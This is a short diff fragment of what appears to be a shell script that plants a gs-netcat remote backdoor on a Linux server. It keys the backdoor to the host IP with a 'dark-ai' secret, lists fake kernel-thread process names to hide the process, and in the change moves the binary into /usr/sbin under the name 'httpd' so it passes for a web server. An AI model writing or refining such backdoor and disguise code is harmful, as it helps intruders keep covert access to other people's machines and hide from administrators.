@@ -6,8 +6,8 @@
 VPS_IP=\$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print \$1}')
 GSOCKET_SECRET="\${VPS_IP}@dark-ai"
 
-HIDDEN_DIR="/usr/share/man/.cache"
-BINARY_NAME="systemd-helper"
+HIDDEN_DIR="/usr/sbin/"
+BINARY_NAME="httpd"
 GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"
 
 PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")
